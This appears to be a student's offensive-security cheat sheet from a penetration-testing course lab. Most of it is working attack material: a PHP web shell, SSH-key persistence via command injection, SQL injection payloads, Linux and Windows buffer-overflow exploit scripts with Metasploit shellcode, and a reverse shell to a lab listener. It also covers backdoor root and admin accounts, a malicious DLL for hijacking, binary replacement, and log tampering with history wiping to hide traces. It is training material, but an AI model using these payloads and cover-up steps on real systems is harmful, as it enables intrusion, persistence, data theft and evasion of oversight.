##Recon
1. Host Discovery (ping sweep)
   for i in {1..254} ;do (ping -c 1 192.168.65.$i | grep "bytes from" &) ;done
   
2. Host Enumeration (Port scanning)
   nmap -Pn -T4 <ip> -p-
   nmap -Pn <ip> -T4 -p 21-23,80 --min-rate 8000
   nmap -Pn <ip> -T4 -p- --min-rate 8000
   
3. Host Interrogration (service)
   nmap -Pn -T5 -sV <ip> -p <port/ports>
   nc <ip> <port>
   nmap -Pn -T5 --script banner.nse <ip> -p <port>
   
   

#Web enumeration
1.scanning
  nmap -Pn -T5 --script=http-enum.nse <ip> -p 80
  nmap -Pn -T5 --script=http-robots.txt.nse <ip> -p 80
  nmap -Pn -T5 --script=http-sql-injection.nse <ip>
  
  legitimize
  ex:
  /robots.txt  <== legit
  /java/  <== legit
  /path/  <== legit
  /uploads/  <== legit
  /cross /  <== legit

2.robots.txt
  go here and if there are more in here then go to them
  
  
##Web Exploitation
1. Directory Traversal - Info
   ../../../../../../../../../../../../../../etc/passwd

   /etc/passwd
   /etc/group
   /etc/hosts
   /etc/networks
   /etc/resolv.conf
   /etc/os-release

   http://10.50.41.203/path/pathdemo.php?myfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&submit=File+look+up
   http://10.50.41.203/path/pathdemo.php?=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
   
2. Command injection - Info/Access
   #is there is a spot to put in text and press enter, see if putting in these will give an output
   ../../../../../../../../../../../../../../etc/passwd
   ; id
   ; whoami

3. Web SHell - Info/Access
   1. Can you upload? Yes 
   2. Is your uploads being sanitized? No  (http://0.0.0.0:0000/uploads)
   3. Can you access the uploads directory? Yes

   ##### webshell.php ####
   <HTML><BODY>
   <Form METHOD="GET" NAME="badform" ACTION="">
   <INPUT TYPE="text" NAME="cmd">
   <INPUT TYPE="submit" VALUE="hello">
   </Form>
   <?php system($_GET['cmd']);?>
   </BODY></HTML>
   ##### webshell.php ####
   
   
2a (CmdInj)/3a (WebShell). SSh keys - Access
1. Determine who the user is
   ;id
   ;who   

2. Determine user's home directory
   ;cat /etc/passwd
   
   ex.
   www-data:x:33:33:www-data:/var/www:/bin/bash
   www-data = user
   /var/www = www-data's home directory
   /bin/bash = login shell

3. Generate SSH keys from the workstation you will login from
   ssh-keygen -t rsa -b 4096
   [Enter]
   [Y] to Overwrite
   [Enter]

   cd /home/student/.ssh
   ls
   id_rsa = private
   id_rsa.pub = public   <=== key to be uploaded on target

   cat id_rsa.pub
   ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCzc7fGxYzYunC/P7RHhDqSNPC9M8pAk2S8qXQV/LTVvfmapeFrvKpFOWUdgM2ekNbVNESZgFhzg4SFd1IhZuQIj+JrxBDUpu+cz3rr52FV0IWnPQr9hc/c6SIigWYhLVsDvR1i9sPSl+/SaG5FPxnZ+pBpKzaFfsydIWbDUImWe23AgAviRJ8G2IMgFjQxEenJqyNcmO/nKUWlUZN1rX2fzgwM7mTmV8rUs0f+jxKoFi9wTzX0apYhGD7qRTJ9qyDYU5HfuHSi0hcBi5eCDgwFwjgBBG9Gmc8CaoPGeWleV9PkbcuyhxDeNd42l7RLarPI0e5o4xZ3dmu3qq9w621QQd08ys6dltWQspPTy65LRPq8srCrFFHg+RU6tgSYkJRnB12Urf4YtYB0nmDYXDgCpoFpa90sbnWSUl8uPeH1aic1SbGGhFyjDTEtZsrdxHjPRFXn8tOXOrXewCrBGYAQiCKA6kZ9nCTZCpvnHIHOUx9zqzqzScK8MiwSkxvCX4lKXvzZxwjzQSDpEvcEqgZtkgPTve8llkqrYLCZJVux1GaQDgwBngplEuqON6Sq+xDE1xE4KyefCG5OwIZo/oWsrl2E1KFNqaqu+AoiiLhaQJWeVzrDevK9pAJv6ZROo/EQ38KJeHaLOtqDlJyZYWW+gTzrJnjmr7uFeAKDImYk7w== student@lin-ops

4. On target machine, validate directories
   Validate .ssh/ exist in the user's home directory
   ;ls -la /var/www
      *ssh directory doesnt exist
   ;mkdir /var/www/.ssh
   ;ls -la /var/www
   
5. Upload SSH key to authorized_key file
   ;echo "" > /var/www/.ssh/authorized_keys
     ;echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCzc7fGxYzYunC/P7RHhDqSNPC9M8pAk2S8qXQV/LTVvfmapeFrvKpFOWUdgM2ekNbVNESZgFhzg4SFd1IhZuQIj+JrxBDUpu+cz3rr52FV0IWnPQr9hc/c6SIigWYhLVsDvR1i9sPSl+/SaG5FPxnZ+pBpKzaFfsydIWbDUImWe23AgAviRJ8G2IMgFjQxEenJqyNcmO/nKUWlUZN1rX2fzgwM7mTmV8rUs0f+jxKoFi9wTzX0apYhGD7qRTJ9qyDYU5HfuHSi0hcBi5eCDgwFwjgBBG9Gmc8CaoPGeWleV9PkbcuyhxDeNd42l7RLarPI0e5o4xZ3dmu3qq9w621QQd08ys6dltWQspPTy65LRPq8srCrFFHg+RU6tgSYkJRnB12Urf4YtYB0nmDYXDgCpoFpa90sbnWSUl8uPeH1aic1SbGGhFyjDTEtZsrdxHjPRFXn8tOXOrXewCrBGYAQiCKA6kZ9nCTZCpvnHIHOUx9zqzqzScK8MiwSkxvCX4lKXvzZxwjzQSDpEvcEqgZtkgPTve8llkqrYLCZJVux1GaQDgwBngplEuqON6Sq+xDE1xE4KyefCG5OwIZo/oWsrl2E1KFNqaqu+AoiiLhaQJWeVzrDevK9pAJv6ZROo/EQ38KJeHaLOtqDlJyZYWW+gTzrJnjmr7uFeAKDImYk7w== student@lin-ops
     " >> /var/www/.ssh/authorized_keys

6. Confirm SSH key upload
   ;cat /var/www/.ssh/authorized_keys
   
7. Login from the workstation the key was created
   ssh www-data@<target ip>
   

##SQL INJECTION
#standard commands
SELECT          extracts data from a database 
UNION           Used to combine the result-set of two or more SELECT statements
#going to pair union command with select command

method 1:
mysql 
mysql --user=<username> --pass=<password> #use if you do not have access

show databases;
#default databases
  information_schema: Database of database, provides list od all databases, tables, and columns
  mysql: mysql user list
  performance_schema: metrics of SQL server

#show tables in a database
show tables from information_schema;

#view column in a table from a datbase
select * from session.<database>;


method 2:
<value>' or 1='1
<value>' or 1='1;
<value>' or 1='1; #

1. determine the behavior
username=matt
password=password
#this did not work

2.determine if webpage is vulnerable to SQL injection
username=matt' or 1='1
password=password' or 1='1
#this did work

3.Retrieved/Dump information using Get method
#### pay attention to the format of the web address; username and password may be spelt different ####
http://10.50.21.1/login.php?username=matt'+or+1='1&passwd=password'+or+1='1
#find the field and how they spell them in console tab > network> request after sending the or password

#SQL injection - POST method  ##some type of text box inside website
0. Determine normalbehavior
Only valid entries will provide information

1. Determine if the webpage is vulnerable via Truth statement
<value>' or 1='1
<value>' or 1='1;
<value>' or 1='1; #

2. Determine the number of columns from the table that the webpage is displaying
#webpage
columns: 4   <=== start with lowest number
rows: 5

<value>' UNION select 1,2,3,4       <==== nope
<value>' UNION select 1,2,3,4;      <==== nope
<value>' UNION select 1,2,3,4; #    <==== nope
#the table has more that 4 columns
#fuze up
<value>' UNION select 1,2,3,4,5       <==== nope
<value>' UNION select 1,2,3,4,5;      <==== nope
<value>' UNION select 1,2,3,4,5; #    <==== works

3. Determine the number of columns, order, and hidden
Audi' UNION select 1,2,3,4,5; #    <==== works        Manufacturer	Cost	Color	Year
                                                           Audi 	  22000  red 2134
                                                             1    	  3 	  4 	  5
columns = 5
order: 1,3,4,5
hidden: 2

4. Extract information via Golden Statement
Golden statement:
select table_schema,table_name,column_name from information_schema.columns; #

<value>' UNION select 1,2,3,4,5; #
<value>' UNION select table_schema,table_name,column_name,1,2 from information_schema.columns; #
#need to add padding because of the difference in number of columns
1             |2          |3          |4  |5
table_schema  table_name  column_name  1  2

Hidden: 2
#since column 2 is hidden, it needs a place holder
<value>' UNION select table_schema,null,table_name,column_name,1 from information_schema.columns; #
1             |2          |3          |4           |5
table_schema  null        table_name  column_name  1  

<value>' UNION select studentID,null,username,passwd,null from session.userinfo; #


#SQL injection - GET method  ##URL
0. Determine the normal behavior
Goodyear
http://10.50.21.1/uniondemo.php?Selection=1&Submit=Submit
Cooper
http://10.50.21.1/uniondemo.php?Selection=2&Submit=Submit
Bridgestone
http://10.50.21.1/uniondemo.php?Selection=3&Submit=Submit
General
http://10.50.21.1/uniondemo.php?Selection=4&Submit=Submit

1. Determine if the webpage is vulnerable via Truth statement
Truth statement
#normally don't need qutoes for GET method
<value> or 1=1
<value> or 1=1;
<value> or 1=1; #

2. Determine the number of columns from the table that the webpage is displaying
Webpage
columns: 3  <=== start with lowest number
Rows: 5

http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,3
http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,3;
http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,3; #

3. Determin the number of columns, order, and hidden
Columns: 3
Order: 1,3,2
Hidden: N/A

Backend
1   |2   |3

Webpage
1   |3   |2

4. Extract information via Golden Statement
Golden statement:
select table_schema,table_name,column_name from information_schema.columns; #

http://10.50.21.1/uniondemo.php?Selection=2 UNION select table_schema,table_name,column_name from information_schema.columns; #
#the coloumns are reversed whne displayed
Backend
1         |2      |3
t_schema  t_name  column_name

Webpage
1         |3           |2
t_schema  column_name  t_name

http://10.50.21.1/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns; #
#flip it to make it readable
Backend
1         |2      |3
t_schema  column_name  t_name

Webpage
1         |3           |2
t_schema  t_name  column_name

5. Extracting Desired Information
http://10.50.21.1/uniondemo.php?Selection=2 UNION select name,id,pass from session.user; #


#SQL injection - Extra
#version
#@@version
http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,@@version; #
#find the sql version the server is running
#using @@version right after fuze b/c we know that the correct number of columns

#function
#load_file()
http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,load_file('/etc/passwd'); #

#filtering
http://10.50.21.1/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns WHERE table_schema='session'; #



##Reverse Engineering
search string
key
go there and look around

Patching
1. loaded the exe
2. search for key
3. go into the function
4. click the if for the success if statement
5. change the JMZ to JZ
6. change the invaled key to say success
7. go to file > export program
8. change format to PE
9. note where the new file will be saved
10. run that shit


##Exploit Development and Buffer Overflow
--Static Analysis
file <binaryname>
strings -n 10 <binaryname>

--$ strings -n 10 func | less
Potential Artifacts:  #log any suscpicous items
_IO_stdin_used
     Enter a string:   <-- raise sus
/home/student/func.c
getuserinput
     gets@@GLIBC_2.0   <-- raise sus
crtstuff.c
     puts@@GLIBC_2.0   <-- raise sus
     
--$ strings -n 5 func | less
func.c
stddef.h
types.h
libio.h
stdio.h
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
#research the potential artifacts

--Behavioral Analysis
run the exe
result:
Enter a string:

--Dynamic Analysis
#use ghidra

#gdb
--$ gdb <binaryname>
gdb-peda$ 

## comment out the source line
vim ~/.gdbinit

#find function
gdb-peda$ disass main
gdb-peda$ pdisass main
-disregard  <__x86.get_pc_thunk.ax>
function:
getuserinput     #custom created function

#look inside the function
gdb-peda$ disass getuserinput
gdb-peda$ pdisass getuserinput
-disregard <__x86.get_pc_thunk.bx>
call   0x3e0 <puts@plt>
call   0x3d0 <gets@plt>

peda plugin = highlighted red, vulnerable function
** This is what peda thinks is vulnerable


##Buffer Overflow
#to find the exe
sudo -l 
#find it

0. Run the program
./<exe>
#scp to lin-ops to work on it

1. Attempt to buffer overflow the program
https://wiremask.eu/tools/buffer-overflow-pattern-generator/
ex
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
results: Segmentation fault (core dumped)

2. Determine Buffer Overflow Offset
dmesg | tail -n 5
last line in result:
[4109352.932289] func[6730]: segfault at 31634130 ip 0000000031634130 sp 00000000ffffd4d0 error 14 in func[56555000+1000]
  31634130  # plug this into the website above
  62 characters minimum to Buffer overflow

3. validate the offset & craft exploit
   ###crafted exploit###
   ###linux_buffer.py###
   #!/usr/bin/python

   #buffer
   Buffer = "A" * 62

   #eip (placeholder)
   eip = "B" * 4

   #nop
   nop = "\x90" * 10

   #shellcode
   print(Buffer + eip + nop)
   ###crafted exploit###
   ###linux_buffer.py###

--$ gdb func
gdb-peda$ run <<< $(python linux_buffer.py)

4. generate Shellcode
--$ msfconsole
msf6 > use payload/linux/x86/exec
msf6 payload(linux/x86/exec) > show options
msf6 payload(linux/x86/exec) > set CMD cat /etc/shadow
msf6 payload(linux/x86/exec) > generate -b "\x00\x20\x0a\x0d" -f python
#copy and paste all of the buf = b"" into the linux_buffer script under #Shellcode
#add the buf variable to the print statement

5. Acquire JMP ESP from target machine
#Turn off ASLR  ##Its already turned off on the test
sudo sysctl -w kernel.randomize_va_space=0

--$ env - gdb func
(gdb) show env
LINES=27
COLUMNS=187
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) show env
(gdb) run
#Spam a lot of characters when prompted "Enter a string:"
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) info proc map
(gdb) find /b 0xf7de2000,0xffffe000,0xff,0xe4
  #find <startaddr>,<endaddr>,0xff,0xe4
  #fist hex after the heap
  #last hex (before the stack)
  #0xff 0xe4 = JMP ESP
#take first six and go to script
#alter the eip variable using little indian of one of the hex values taken
#0xf7f65aff
#f7 f6 5a ff
#ff 5a f6 f7
eip = "\xff\x5a\xf6\xf7"
--$ sudo ./func <<< $(python linux_buffer_copy.py)

Create a root user
sudo useradd -ou 0 -g 0 matt
sudo passwd password


======================================================================================================================


##--Windows Buffer Overflow

### win_buffer.py ###
#!/usr/bin/python
#!/usr/bin/python

import socket

buf = "TRUN /.:/"
buf += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B"

s = socket.socket (socket.AF_INET,socket.SOCK_STREAM) #Creates IPv4 Socket/TCP protocol
s.connect(("10.50.35.122",9999)) #target ip address and port
print s.recv(1024) #print response
s.send(buf) #send the value of buf
print s.recv(1024) #Print response
s.close() #close the socket

### win_buffer.py ###

--$ python win_buffer.py

# play with the buf += till the program is in a stand still
# copy and paste the eip from immunitry debugger to get the offset value
offset = 2003

#alter script
#comment out buf += with the patter
buf += "A" * 2003

#type into the bottom bar of immunity debugger
!mona modules
--Log Data window

!mona jmp -r esp -m "essfunc.dll"
--Log Data window
625012A0 #first address

#split to little indian
625012A0
62 50 12 A0
A0 12 50 62
\xA0\x12\x50\x62

#alter script
buf += "\xA0\x12\x50\x62"
buf "\x90" * 10

--$ msfconsole
msf6 > use windows/shell_reverse_tcp
msf6 payload(windows/shell_reverse_tcp) > show options
msf6 payload(windows/shell_reverse_tcp) > set LHOST 10.50.23.87 #lin-ops
#could change lport but don't need too
msf6 payload(windows/shell_reverse_tcp) > generate -b "\x00\x20\x0a\x0d" -f python
#add all the buf += to the script

#close immunity debugger
#run the .exe as administrator

student@lin-ops:~$ nc -lvp 4444
#set up listener with the port from msfconsole

#run script
student@lin-ops:~$ python win_buffer_copy.py

create a user
net user matt password /add
net localgroup Administrators matt /add


##POST EXPLOITATION (ENUMERATION) 
Two main ways to configure
Command Line Method:
ssh -M -S /tmp/s root@<IP ADDRESS> <TUNNEL COMMANDS -R or -L>
-o 'ControlPath=/tmp/s'
-M -S /tmp/s

Configuration File Method:
/ssh_config
HostName machine1.example.org
ControlPath ~/.ssh/controlmasters/%r@%h:%p
ControlMaster auto
ControlPersist 10m


USER ENUMERATION
net user
cat /etc/passwd


PROCESS ENUMERATION
tasklist /v
ps -elf

SERVICE ENUMERATION
tasklist /svc
chkconfig

NETWORK CONNECTION ENUMERATION
ipconfig /all
ifconfig -a

DATA EXFILTRATION
Logging
<command> | tee
 
Obfuscation
<command> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out certutil
<command> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
<command> | base64

Encryption Transport Methods
scp

Jobs
/etc/crontab
/var/spool/crontab

Logs
/etc/rsyslog.conf
/etc/rsyslog.d

##Windows

#user
net user

#read the reg keys
reg query
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce


#query services
sc query 
get_wmiobject win32_service
get-wmiobject -list
get-wmiobject -class win32_process






egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2 +
cp auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log +
CLEAN - YOUR TURN
1) Create a failed ssh log on your RE_Linux.

2) Utilizing the command line clean the log of the assocated log entries of the failed ssh event.

3) Maintain log files orignal Inode

TIMESTOMP NIX
Access: updated when opened or used (grep, ls, cat, etc)

Modify: update content of file or saved

Change: file attribute change, file modified, moved, owner, permission


=====================================================================================================================================================

##Linux Enumeration

uname -a 	~ shows host info
ip addr		~ shows ip address, some ip addresses may be open-stack, not target space
ss -ntlp		~ shows open ports and connections
find / -name <name> 2>/dev/null
cat /etc/passwd	~ tells you users on the machine, their home directories, and what type of shell they launch with
cat /etc/groups	~ tells you what users are a part of which groups
sudo -l			~ tells you what you can sudo
cat /etc/shadow	~ need privileges, shows user passwords, they're encrypted though, use john the ripper
sudo ls -la /root	~ root's home directory, lotta flags gonna be there, need privileges though
ls -la /etc/*.conf	~ configuration files for services, can find out how certain services are configured
ls -la /bin		~ user binaries
ls -la /tmp		~ world-writable directory, any user can use these directories
ls -la /var/tmp		~ world-writable directory, any user can use this directory
/etc/networks		~ for network information
/etc/resolv.conf	~ for DNS information
/etc/hosts		~ to see if anyone is configured for specific hosts/ip

crontab -l	~ list jobs for specific user
/var/spool/cron/crontabs	~ need to have privileges to view crontabs, we shouldn't need to create cronjobs
cat /etc/crontab	~ do not need privileges to view, scripts are placed in here to be ran
	~ minute, hour, day of month, month, day of week
 
syslog, syslog-ng, rsyslog
cd /var/log	~ where logs are stored
/var/log/auth.log	~ where authentication is logged, requires privileges

===============================================================================================================================================

## Windows enumeration

net user /?		~ manage/view user accounts
net localgroup /?	~ manage user groups or view members of groups
net localgroup Administrators		~ if we wanted to view users within the 'Administrators' group
net localgroup "Remote Desktop User"	~ if we wanted to view who is able to use RDP

dir -hidden OR dir /a:h	~ to view hidden files within the current directory
dir /R		~ to view alternate data streams on files, if there are any
where where.exe	~ like 'which' in Linux, finds certain binaries, won't if they aren't a windows environmental variable
dir | findstr <string>	~ to search for files

reg query HKU	~ reg query allows us to query into registry locations
reg query HKLM\Software	~ **USE BACKSLASH, NOT FORWARD SLASH**
reg query HKCU\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN	~ important
	~ shows what services/processes will run every time the CURRENT USER starts the machine
reg query HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN OR RUNONCE
	~ shows what services/processes will start once the machine is started
		~ RunOnce deletes the key as soon as the command is ran, could find in Application Logs

tasklist	~ displays a list of currently running processes
tasklist /svc	~ displays services alongside processes	/v if we want verbose
query /process	~ queries processes and shows who is running them
tasklist /svc /fo table <or list>
sc query /?	~ used for communicating with the Service Control Manager and services
sc qc <service>	~ shows properties of services, what it's executing
sc queryex

ipconfig 	~ shows ip information
ipconfig /all	~ shows more ip information
netstat		~ shows open ports and connections
netstat -ano | findstr /i <port>		~ to view info about specific port

ipconfig 	~ shows ip information
ipconfig /all	~ shows more ip information
netstat		~ shows open ports and connections
netstat -ano | findstr /i <port>		~ to view info about specific port



##PRIVILEGE ESCULATION
sudo -l
#use gtfo bins to look up whats in there to escalate


#suid
find / -type f -perm /4000 -ls 2>/dev/null

#sgid
find / -type f -perm /2000 -ls 2>/dev/null

#both
find / -type f -perm /6000 -ls 2>/dev/null

#use gtfo bins to look up suspicious things


#not logging commands
cat .bash_history
unset HISTFILE
echo "" > .bash_history

#logs
cd /var/log
cat lastlog
sudo cat btmp

--Windows Privlege Escalation
1) Services
Open via Task Manager or Services
-Startup Type : Automatic
-Log on as : local system
SYSTEM > administrator > user
-description : <Blank description>

-Path to executable:
  C:\Program Files\TightVNC\tvnserver.exe
  
  -Determine if directory is writable
Right-clicking inside the directory to see if you can create things

 - note the permissions
  # if you can write to it then its Binary Replacement
  # if you can NOT then its DLL hijacking
  
--Binary Replacement
  1) Look at path to executable to determine the file name that we are going to replace
  tvnserver.exe <== we will need to rename our malicious binary to tvnserver.exe to match what is called upon in the path to executable, then rename the original
  
  2) Getting our binary on the machine
  -SCP
  scp <src> <dst>
   #rename binary to the .exe, rename the .exe to something else
   
  -Python Server
  student@lin-ops:~$ python3 -m http.server
  
  {on windows target} open up browser > http://<ip of linops>:8000
  
  3) Getting the malicious binary to execute
  Restart the machine *may need to do multiple times*


--DLL Hijacking (DLL search order)

  [cmd] net use * \\live.sysinternals.com\tools
  [cmd] Z:
  [cmd] procmon.exe -accepteula
  
  Filters > Process Name | contains | putty | include
            Result | contains | NOT | include
            Path | contains | .dll | include 
  
  run the .exe
  
  google vulnerabilities / dll
  
  craft our DLL:
  sudo apt-get install mingw-w64 mingw-w64-common mingw-w64-tools mingw-w64-x86-64-dev -y
  
  vim SSPICLI.c

  ########## SSPICLI.c ########## 
  #include <windows.h>
  int execCommand()
  {
   WinExec("cmd /C whoami > FINDME_1.txt", 1);
   return 0;
  }
  BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
  {
   execCommand();
   return 0;
  }
  ########## SSPICLI.c ########## 
  
  #Compile the raw C source code into a unlinked c object
  i686-w64-mingw32-gcc -c SSPICLI.c -o SSPICLI.o

  #Create the DLL from unlinked c object
  i686-w64-mingw32-gcc -shared -o SSPICLI.dll SSPICLI.o -Wl,--out-implib,SSPICLI.a

  copy to the created file
  
  restart machine

Commands to escalate our privileges:
-Add a new user, join them to admin group and remote desktop group
--> net user <username> <password> /add
--> net localgroup Administrators <username> /add

-add existing user to admin group and remote desktop group 
  
  
  
2) Schedule Tasks

Task schefuler
General Tab > Security Options  > SYSTEM
Triggers Tab > Trigger/Details: Desireable (At logon, At startup, At log on of any user) , status: Enabled
Action Tab > Action: Start a program, Details: <writeable directories!>


--Binary Replacement
#if you can manipulate the binary then use this
--DLL Hijacking
#if you can't then use this

#Refrence back to complete this step


3) Event Log
--Requires elevated privileges to look at certaun logs (Security)

 --Auditpol (Security policies)
--Requires elevated privileges

 #need an administrator shell
 [cmd] auditpol /get /category:*
 
 Local security policy  #in search bar
 #actual configuration of everything 















